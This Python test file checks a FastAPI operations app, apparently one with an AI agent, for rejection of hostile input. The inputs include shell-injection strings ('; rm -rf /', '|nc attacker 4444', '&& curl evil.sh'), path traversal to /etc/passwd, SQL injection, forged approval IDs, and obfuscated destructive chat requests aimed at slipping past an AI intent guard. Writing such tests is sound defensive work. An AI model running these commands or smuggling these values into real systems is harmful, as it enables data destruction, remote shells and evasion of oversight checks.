"""Adversarial input tests: assume the caller is hostile, not merely sloppy."""

from urllib.parse import quote

from app.main import app
from fastapi.testclient import TestClient

client = TestClient(app)

REGISTRIES = {"cloudhelm", "registry.local"}


def test_image_prefix_spoofing_is_rejected():
    """Regression: `startswith("cloudhelm/")` accepted traversal and metacharacters."""
    for image in (
        "cloudhelm/../../../etc/passwd:latest",
        "cloudhelm/../evil:1",
        "cloudhelm/ai-agent:1; rm -rf /",
        "cloudhelm/ai-agent:1 && curl evil.sh",
        "cloudhelm/ai-agent:1|nc attacker 4444",
        "cloudhelm/$(whoami):1",
        "cloudhelm/`id`:1",
        "cloudhelm/ai agent:1",
        "cloudhelm/./ai-agent:1",
        "cloudhelm//ai-agent:1",
        "cloudhelm/ai-agent:", 
        "cloudhelm",
        "cloudhelmai-agent:1",
        "/cloudhelm/ai-agent:1",
    ):
        response = client.post('/api/ai/update', json={'deployment': 'ai-agent', 'image': image})
        assert response.status_code == 400, f'accepted hostile image: {image!r}'


def test_approved_images_are_accepted():
    for image in (
        "cloudhelm/ai-agent:demo",
        "cloudhelm/ai-agent",
        "cloudhelm/team/ai-agent:v1.2.3",
        "registry.local/ai-agent:demo",
    ):
        response = client.post('/api/ai/update', json={'deployment': 'ai-agent', 'image': image})
        assert response.status_code == 200, f'rejected valid image: {image!r}'
        assert response.json()['requires_approval'] is True


def test_approval_cannot_be_replayed_or_forged():
    pending = client.post('/api/scale', json={'deployment': 'guide-service', 'replicas': 3}).json()
    action_id = pending['action_id']
    assert client.post('/api/agent/approve', json={'action_id': action_id, 'approved': True}).status_code == 200
    # Replay must fail: a one-shot approval cannot be used twice.
    assert client.post('/api/agent/approve', json={'action_id': action_id, 'approved': True}).status_code == 404
    for forged in ('../../etc/passwd', "1' OR '1'='1", 'a' * 200, ''):
        assert client.post('/api/agent/approve', json={'action_id': forged, 'approved': True}).status_code in (404, 422)


def test_resource_names_reject_path_and_shell_characters():
    for name in ('../../etc/passwd', "a'; DROP TABLE pods;--", 'guide-service; rm -rf /', '$(id)', '`id`'):
        kill = client.post('/api/chaos/kill', json={'pod_name': name})
        assert kill.status_code in (404, 422), f'pod name accepted: {name!r}'
        scale = client.post('/api/scale', json={'deployment': name, 'replicas': 2})
        assert scale.status_code in (400, 422), f'deployment name accepted: {name!r}'


def test_oversized_and_malformed_bodies_are_rejected():
    assert client.post('/api/ai/chat', json={'question': '删' * 100_000}).status_code == 422
    assert client.post('/api/chaos/kill', json={'pod_name': 'a' * 5000}).status_code == 422
    assert client.post('/api/scale', json={'deployment': 'guide-service', 'replicas': -1}).status_code == 422
    assert client.post('/api/scale', json={'deployment': 'guide-service', 'replicas': 999999}).status_code == 422
    assert client.post('/api/scale', json={'deployment': 'guide-service', 'replicas': 'abc'}).status_code == 422
    assert client.post('/api/scale', json={'deployment': None, 'replicas': None}).status_code == 422
    assert client.post('/api/ai/chat', content=b'{not-json', headers={'Content-Type': 'application/json'}).status_code == 422
    assert client.post('/api/ai/chat', content=b'question=hi', headers={'Content-Type': 'text/plain'}).status_code == 422


def test_unicode_and_control_characters_are_handled():
    assert client.post('/api/ai/chat', json={'question': '🚀 系统健康度如何'}).status_code == 200
    assert client.post('/api/ai/chat', json={'question': 'a\x00b'}).status_code == 200
    assert client.post('/api/chaos/kill', json={'pod_name': 'guide-service\u202e001'}).status_code in (404, 422)


def test_destructive_guard_survives_obfuscation():
    """Whitespace and separator tricks must not slip past the intent matcher."""
    for question in ('删 除 pod', '删\tpod', '删pod', 'DELETE POD', 'DeLeTe the pod', '干掉  容器'):
        body = client.post('/api/ai/chat', json={'question': question}).json()
        assert body['severity'] == 'critical', f'not blocked: {question!r}'
